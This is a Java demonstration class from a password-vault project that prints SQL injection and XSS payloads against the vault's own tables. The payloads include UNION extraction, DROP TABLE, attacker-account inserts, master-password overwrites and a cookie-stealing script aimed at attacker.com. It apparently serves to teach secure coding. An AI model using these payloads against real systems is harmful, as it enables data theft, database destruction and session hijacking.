package com.ishan.passvault.security;

/**
 * DEMONSTRATION: SQL Injection Vulnerabilities in Password Vault
 * 
 * WARNING: This is for educational purposes only to show potential vulnerabilities.
 * DO NOT use these examples in production code.
 */
public class SQLInjectionDemo {
    
    public static void main(String[] args) {
        System.out.println("=== SQL INJECTION VULNERABILITY DEMONSTRATION ===\n");
        
        demonstrateSearchInjection();
        demonstrateServiceNameInjection();
        demonstrateUsernameInjection();
        demonstrateNotesInjection();
    }
    
    /**
     * Example 1: Search Term Injection
     * 
     * If the search functionality doesn't properly sanitize input, an attacker could:
     */
    public static void demonstrateSearchInjection() {
        System.out.println("1. SEARCH TERM INJECTION:");
        System.out.println("------------------------");
        
        // Malicious search terms that could be entered by users:
        String[] maliciousSearches = {
            // Extract all users' data
            "' OR 1=1 --",
            "' OR '1'='1",
            
            // Union attack to get all password entries
            "' UNION SELECT * FROM password_entries --",
            
            // Drop tables
            "'; DROP TABLE password_entries; --",
            
            // Insert malicious data
            "'; INSERT INTO password_entries (service_name, username, encrypted_password, user_id) VALUES ('hacked', 'attacker', 'stolen', 1); --",
            
            // Extract database schema
            "' UNION SELECT table_name FROM information_schema.tables --",
            
            // Get all usernames
            "' OR service_name LIKE '%' OR username IN (SELECT username FROM users) --"
        };
        
        for (String malicious : maliciousSearches) {
            System.out.println("Malicious input: " + malicious);
            System.out.println("Potential SQL: SELECT * FROM password_entries WHERE user_id = ? AND (service_name LIKE '%" + malicious + "%' OR username LIKE '%" + malicious + "%')");
            System.out.println("Result: Could extract all data, modify database, or cause system damage\n");
        }
    }
    
    /**
     * Example 2: Service Name Injection
     * 
     * When adding a new password entry:
     */
    public static void demonstrateServiceNameInjection() {
        System.out.println("2. SERVICE NAME INJECTION:");
        System.out.println("-------------------------");
        
        String[] maliciousServiceNames = {
            // Insert multiple entries
            "legit'; INSERT INTO password_entries (service_name, username, encrypted_password, user_id) VALUES ('hacked', 'attacker', 'stolen', 1); --",
            
            // Update existing entries
            "legit'; UPDATE password_entries SET encrypted_password = 'hacked' WHERE user_id = 1; --",
            
            // Delete all entries
            "legit'; DELETE FROM password_entries WHERE user_id = 1; --",
            
            // Create new user
            "legit'; INSERT INTO users (username, master_password_hash, salt, created_at, is_active) VALUES ('hacker', 'hash', 'salt', NOW(), true); --"
        };
        
        for (String malicious : maliciousServiceNames) {
            System.out.println("Malicious service name: " + malicious);
            System.out.println("When stored in database, could execute: " + malicious);
            System.out.println("Result: Database manipulation, data theft, or system compromise\n");
        }
    }
    
    /**
     * Example 3: Username Injection
     */
    public static void demonstrateUsernameInjection() {
        System.out.println("3. USERNAME INJECTION:");
        System.out.println("---------------------");
        
        String[] maliciousUsernames = {
            // Cross-site scripting in username
            "<script>alert('XSS')</script>",
            
            // SQL injection in username
            "user'; DROP TABLE users; --",
            
            // Very long username to cause buffer overflow
            "A".repeat(10000),
            
            // Null byte injection
            "user\0; DROP TABLE password_entries; --"
        };
        
        for (String malicious : maliciousUsernames) {
            System.out.println("Malicious username: " + malicious);
            System.out.println("Risk: " + getRiskDescription(malicious));
            System.out.println();
        }
    }
    
    /**
     * Example 4: Notes Field Injection
     */
    public static void demonstrateNotesInjection() {
        System.out.println("4. NOTES FIELD INJECTION:");
        System.out.println("-------------------------");
        
        String[] maliciousNotes = {
            // XSS attack
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            
            // SQL injection
            "'; UPDATE users SET master_password_hash = 'hacked' WHERE id = 1; --",
            
            // HTML injection
            "<img src=x onerror=alert('XSS')>",
            
            // JavaScript injection
            "javascript:alert('XSS')"
        };
        
        for (String malicious : maliciousNotes) {
            System.out.println("Malicious notes: " + malicious);
            System.out.println("Risk: " + getRiskDescription(malicious));
            System.out.println();
        }
    }
    
    private static String getRiskDescription(String input) {
        if (input.contains("<script>")) {
            return "Cross-site scripting (XSS) attack";
        } else if (input.contains("DROP TABLE")) {
            return "Database destruction";
        } else if (input.contains("UNION SELECT")) {
            return "Data extraction attack";
        } else if (input.contains("INSERT INTO")) {
            return "Data injection attack";
        } else if (input.length() > 1000) {
            return "Buffer overflow attempt";
        } else if (input.contains("\0")) {
            return "Null byte injection";
        } else {
            return "General injection attack";
        }
    }
    
    /**
     * REAL-WORLD ATTACK SCENARIO:
     * 
     * 1. Attacker registers with username: "'; DROP TABLE password_entries; --"
     * 2. System tries to store: INSERT INTO users (username, ...) VALUES ('; DROP TABLE password_entries; --', ...)
     * 3. SQL executes: INSERT INTO users (username, ...) VALUES ('', ...); DROP TABLE password_entries; --', ...)
     * 4. Result: All password data is deleted!
     */
    public static void demonstrateRealWorldAttack() {
        System.out.println("5. REAL-WORLD ATTACK SCENARIO:");
        System.out.println("------------------------------");
        
        String maliciousUsername = "'; DROP TABLE password_entries; --";
        String maliciousPassword = "password123";
        
        System.out.println("Attacker input:");
        System.out.println("Username: " + maliciousUsername);
        System.out.println("Password: " + maliciousPassword);
        
        System.out.println("\nVulnerable SQL (if not using prepared statements):");
        System.out.println("INSERT INTO users (username, master_password_hash, salt, created_at, is_active)");
        System.out.println("VALUES ('" + maliciousUsername + "', '" + maliciousPassword + "', 'salt', NOW(), true)");
        
        System.out.println("\nExecuted SQL becomes:");
        System.out.println("INSERT INTO users (username, master_password_hash, salt, created_at, is_active)");
        System.out.println("VALUES ('', 'password123', 'salt', NOW(), true); DROP TABLE password_entries; --', 'password123', 'salt', NOW(), true)");
        
        System.out.println("\nResult: All password entries are deleted from the database!");
    }
} 